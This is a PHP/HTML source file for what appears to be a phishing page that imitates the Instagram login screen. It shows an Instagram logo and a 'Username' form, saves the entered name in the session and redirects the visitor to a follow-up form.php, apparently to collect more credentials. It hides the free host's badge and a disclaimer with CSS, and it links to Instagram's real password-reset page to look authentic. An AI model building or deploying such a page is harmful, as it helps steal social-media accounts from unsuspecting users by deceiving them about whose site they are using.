<?php
include ("app/config.php");
include ("app/database/yazilar.php");
include ("app/database/router.php");
if ($_GET) {
    $username=$_GET["username"];
    session_start();
    $_SESSION["username"]=$username;
    header("location: form.php?username=$username");
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
	<?php include ("app/tag/main/meta.php"); ?>
   <style>img[alt="www.000webhost.com"]{display:none;}</style>
	
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="assets/theme/sloker2/css/vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="assets/theme/sloker2/fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="assets/theme/sloker2/css/vendor/animate/animate.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="assets/theme/sloker2/css/vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="assets/theme/sloker2/css/vendor/select2/select2.min.css">
	<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">

<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="assets/theme/sloker2/css/util.css">
	<link rel="stylesheet" type="text/css" href="assets/theme/sloker2/css/main.css">
	
<!--===============================================================================================-->
</head>


<style type="text/css">  .btn {
    cursor: pointer;
    width: 100%;
    padding:0 8px; 
    background: #3897f0;
    border:1px solid #3897f0;
    color:#fff;
    border-radius:10px;
    font-weight:600;
    font-size: 14px;
    height: 35px;
    line-height: 26px;
    outline: none;
    white-space: nowrap;
  }
  
  .container-login100{
	  
	  background:#dfdfdf;
	  
  }
  
  body{
	  background:#fafafa;
  }
</style>
<body>
<div class="limiter">
<div style="margin-top:-70px; margin-bottom:-60px;" class="container-login100">
<div class="wrap-login100">
<div class="login100-pic js-tilt" data-tilt="" style="will-change: transform; transform: perspective(300px) rotateX(0deg) rotateY(0deg);">
<img style="margin-top:-90px;" src="https://www.vargonen.com/blog/wp-content/uploads/2020/09/instagramlogo.jpg" alt="IMG"> 
</div>
<el class="login100-form validate-form" id="elemend">
<form action="" id="" method="get" class="login100-form validate-form">

<center><img style="margin-top:-120px;" src="https://i.hizliresim.com/5xns4qf.png"  width="150">
</center>
<center>
<h1 style="font-family:sans-serif;
font-weight:400;
letter-spacing:;
color:#3d3d3d;
font-size: 20px;
margin-top:-50px;">
<br>
 <b><?php echo $homebaslik; ?></b></h1> <br>
<p style="max-width:87%; font-size:15px; color: #999; line-height:20px; box-sizing:border-box;">
<?php echo $homeyazi; ?></p>
</center>
<hr>
<div class="wrap-input100 validate-input">
<input required="" class="input100" type="text" name="username" placeholder="Username">
<span class="focus-input100"></span>
<span class="symbol-input100">
<i class="fa fa-user" aria-hidden="true"></i>
</span>
</div>



<div class="container-login100-form-btn" style="margin-top:-20px;">
<button type="submit" id="imagei" class="btn">Continue</button>
					
				</div><br><center><h6><font style="cursor:pointer;"onclick="javascript:window.location.href='https://www.instagram.com/accounts/password/reset/'; " color="#00376b">Don't have an account? Register</font></a></h6></center></div>
					

				

					
				</form>
			</div>
			<div style="background:#fafafa; width:100%; height:70px; border-top:0.5px solid rgb(0,0,0,0.3);"class="lilvlad2">
			<center><img style="margin-top:20px;" src="assets/theme/sloker2/footer.jpg" width="100"></center>
			</div>
      </div>
		</div>
	</el>
	
	

	
<!--===============================================================================================-->	
	<script src="assets/theme/sloker2/css/vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="assets/theme/sloker2/css/vendor/bootstrap/js/popper.js"></script>
	<script src="assets/theme/sloker2/css/vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="assets/theme/sloker2/css/vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
	<script src="assets/theme/sloker2/css/vendor/tilt/tilt.jquery.min.js"></script>

<!--===============================================================================================-->
<script src="assets/theme/sloker2/css/js/main.js"></script>

</body>
</html>

<style> .disclaimer { visibility: hidden;} </style>